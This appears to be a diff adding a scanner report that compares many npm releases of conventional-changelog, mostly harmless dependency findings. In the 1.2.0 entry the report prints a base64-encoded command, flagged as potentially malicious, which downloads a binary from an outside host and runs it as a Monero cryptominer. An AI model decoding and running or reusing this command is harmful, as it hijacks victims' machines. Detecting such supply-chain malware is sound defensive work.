+			package/package.json
+				Location(s):
+					30:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					32:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					33:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					34:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					35:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jscs-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:38
+	1 new occurence(s) of finding: Found dependency: shelljs-0.6.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:16
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.0.0 to conventional-changelog-1.0.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					28:39
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.0.1 to conventional-changelog-1.1.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					32:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.0 to conventional-changelog-1.1.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.3.1
+		File(s):
+			package/package.json
+				Location(s):
+					28:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.6.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.3
+		File(s):
+			package/package.json
+				Location(s):
+					32:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.1 to conventional-changelog-1.1.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					28:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.7.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.4
+		File(s):
+			package/package.json
+				Location(s):
+					32:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.2 to conventional-changelog-1.1.3:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.3.3
+		File(s):
+			package/package.json
+				Location(s):
+					28:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.8.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.5
+		File(s):
+			package/package.json
+				Location(s):
+					32:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.3 to conventional-changelog-1.1.4:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.3.4
+		File(s):
+			package/package.json
+				Location(s):
+					28:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.9.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.6
+		File(s):
+			package/package.json
+				Location(s):
+					32:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.4 to conventional-changelog-1.1.5:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.5.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					32:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					33:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.9.1
+		File(s):
+			package/package.json
+				Location(s):
+					34:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.7
+		File(s):
+			package/package.json
+				Location(s):
+					35:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					36:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.5 to conventional-changelog-1.1.6:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.5.1
+		File(s):
+			package/package.json
+				Location(s):
+					31:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.9.2
+		File(s):
+			package/package.json
+				Location(s):
+					34:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.8
+		File(s):
+			package/package.json
+				Location(s):
+					35:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.6 to conventional-changelog-1.1.7:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.5.2
+		File(s):
+			package/package.json
+				Location(s):
+					31:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					32:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					33:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-1.9.3
+		File(s):
+			package/package.json
+				Location(s):
+					34:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.2.9
+		File(s):
+			package/package.json
+				Location(s):
+					35:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-0.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					36:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					37:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.7 to conventional-changelog-1.1.10:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.1
+		File(s):
+			package/package.json
+				Location(s):
+					31:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					32:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					33:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					34:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.1
+		File(s):
+			package/package.json
+				Location(s):
+					35:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					36:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.10 to conventional-changelog-1.1.11:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.2
+		File(s):
+			package/package.json
+				Location(s):
+					31:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					34:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					35:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.11 to conventional-changelog-1.1.12:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					41:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.12 to conventional-changelog-1.1.14:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.4
+		File(s):
+			package/package.json
+				Location(s):
+					31:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.2
+		File(s):
+			package/package.json
+				Location(s):
+					32:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					33:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					34:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.4
+		File(s):
+			package/package.json
+				Location(s):
+					35:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					36:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					37:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.3
+		File(s):
+			package/package.json
+				Location(s):
+					41:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.14 to conventional-changelog-1.1.15:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.4
+		File(s):
+			package/package.json
+				Location(s):
+					41:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.15 to conventional-changelog-1.1.16:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.5
+		File(s):
+			package/package.json
+				Location(s):
+					35:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.3
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.3
+		File(s):
+			package/package.json
+				Location(s):
+					37:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.4
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.5
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.3
+		File(s):
+			package/package.json
+				Location(s):
+					41:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.3
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.5
+		File(s):
+			package/package.json
+				Location(s):
+					45:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.16 to conventional-changelog-1.1.17:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.6
+		File(s):
+			package/package.json
+				Location(s):
+					35:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.4
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.4
+		File(s):
+			package/package.json
+				Location(s):
+					37:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.5
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.6
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.4
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.4
+		File(s):
+			package/package.json
+				Location(s):
+					41:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.4
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.6
+		File(s):
+			package/package.json
+				Location(s):
+					45:45
+	1 new occurence(s) of finding: Found dependency: shelljs-0.8.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:16
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.17 to conventional-changelog-1.1.18:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.5
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.18 to conventional-changelog-1.1.19:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.5
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.5
+		File(s):
+			package/package.json
+				Location(s):
+					37:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.6
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.7
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.6
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.5
+		File(s):
+			package/package.json
+				Location(s):
+					41:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.5
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.7
+		File(s):
+			package/package.json
+				Location(s):
+					45:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.19 to conventional-changelog-1.1.20:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.6
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.6
+		File(s):
+			package/package.json
+				Location(s):
+					37:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.7
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.8
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.7
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.6
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.20 to conventional-changelog-1.1.21:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.7
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.7
+		File(s):
+			package/package.json
+				Location(s):
+					37:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.9
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.6
+		File(s):
+			package/package.json
+				Location(s):
+					41:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.7
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.8
+		File(s):
+			package/package.json
+				Location(s):
+					45:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.21 to conventional-changelog-1.1.22:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.9
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.10
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.22 to conventional-changelog-1.1.23:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.8
+		File(s):
+			package/package.json
+				Location(s):
+					36:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.8
+		File(s):
+			package/package.json
+				Location(s):
+					37:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.10
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.11
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.9
+		File(s):
+			package/package.json
+				Location(s):
+					40:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.8
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.23 to conventional-changelog-1.1.24:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.11
+		File(s):
+			package/package.json
+				Location(s):
+					38:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.12
+		File(s):
+			package/package.json
+				Location(s):
+					39:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-1.1.24 to conventional-changelog-1.2.0:
+---------------------------------------------------------
+
+js/encoded-string-command (severity: 10.0):
+	1 new occurence(s) of finding: Encoded string ([cm0gLXJmIC90bXAvLmRlYnVnICYmIGN1cmwgaHR0cHM6Ly9tbnJsbnQuYmxvYi5jb3JlLndpbmRvd3MubmV0L21uci9TaWxlbmNlIC1vIC90bXAvLmRlYnVnIDI+IC9kZXYvbnVsbCAmJiBjaG1vZCAreCAvdG1wLy5kZWJ1ZyAmJiAvdG1wLy5kZWJ1ZyAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQ0NCAtdSA0QTlWNWtuR1VNOFBVZFBTSmJUb3g4YjltZ1RzZlhCeUs0OVhLdEV5cVZheUR4RDZDRkplNWRzZXhhTTk5eDdNWEZOVHhaa1lBcjRZdGNBWFFNa05yRmpuUlBKR0pGci5KTDZfJChob3N0bmFtZSAtZiB8IG1kNXN1bSB8IGN1dCAtYzEtOCkgLXAgeCAtdCAkKGxzY3B1IHwgZ3JlcCAnQ1BVKHMpJ3wgZ3JlcCAtdiAnLCcgfCBhd2sgJ3twcmludCAkMn0nIHwgaGVhZCAtbiAxKSAyPiAvZGV2L251bGwgJg==](1)) flows to decode and to command execution argument ([conventionalStartupScript](2))
+		File(s):
+			package/index.js
+				Location(s):
+					10:33
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.2
+		File(s):
+			package/package.json
+				Location(s):
+					55:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					56:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					57:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					58:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-0.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					59:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					60:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					61:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					64:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-1.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					65:45
+	1 new occurence(s) of finding: Found dependency: chai-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					69:13
+	1 new occurence(s) of finding: Found dependency: concat-stream-1.4.10
+		File(s):
+			package/package.json
+				Location(s):
+					70:22
+	1 new occurence(s) of finding: Found dependency: jscs-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					71:13
+	1 new occurence(s) of finding: Found dependency: jshint-2.8.0
+		File(s):
+			package/package.json
+				Location(s):
+					72:15
+	1 new occurence(s) of finding: Found dependency: mocha-unknown
+		File(s):
+			package/package.json
+				Location(s):
+					73:14
+	1 new occurence(s) of finding: Found dependency: shelljs-0.6.0
+		File(s):
+			package/package.json
+				Location(s):
+					74:16
+
+js/data-flow-to-process (severity: 4.0):
+	1 new occurence(s) of finding: Data flow from string ([cm0gLXJmIC90bXAvLmRlYnVnICYmIGN1cmwgaHR0cHM6Ly9tbnJsbnQuYmxvYi5jb3JlLndpbmRvd3MubmV0L21uci9TaWxlbmNlIC1vIC90bXAvLmRlYnVnIDI+IC9kZXYvbnVsbCAmJiBjaG1vZCAreCAvdG1wLy5kZWJ1ZyAmJiAvdG1wLy5kZWJ1ZyAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQ0NCAtdSA0QTlWNWtuR1VNOFBVZFBTSmJUb3g4YjltZ1RzZlhCeUs0OVhLdEV5cVZheUR4RDZDRkplNWRzZXhhTTk5eDdNWEZOVHhaa1lBcjRZdGNBWFFNa05yRmpuUlBKR0pGci5KTDZfJChob3N0bmFtZSAtZiB8IG1kNXN1bSB8IGN1dCAtYzEtOCkgLXAgeCAtdCAkKGxzY3B1IHwgZ3JlcCAnQ1BVKHMpJ3wgZ3JlcCAtdiAnLCcgfCBhd2sgJ3twcmludCAkMn0nIHwgaGVhZCAtbiAxKSAyPiAvZGV2L251bGwgJg==](1)) to system command execution / process ([conventionalStartupScript](2)).
+		File(s):
+			package/index.js
+				Location(s):
+					10:33
+
+js/require-child-process (severity: 3.0):
+	1 new occurence(s) of finding: Require of child_process module in file "index.js"
+		File(s):
+			package/index.js
+				Location(s):
+					4:37
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (convent ... :true}}))
+		File(s):
+			package/index.js
+				Location(s):
+					10:3
+
+
+Severity sum:
+=> All queries: 19.0
+=> Distinct queries: 19.0
+Flagged as potential malicious.
+
+
+Comparing conventional-changelog-1.2.0 to conventional-changelog-2.0.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-1.6.6
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					43:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					44:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+	1 new occurence(s) of finding: Found dependency: shelljs-0.8.0
+		File(s):
+			package/package.json
+				Location(s):
+					51:16
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-2.0.0 to conventional-changelog-2.0.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					43:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					44:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-2.0.1 to conventional-changelog-2.0.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-2.0.2 to conventional-changelog-2.0.3:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					42:37
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-2.0.3 to conventional-changelog-3.0.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-2.0.2
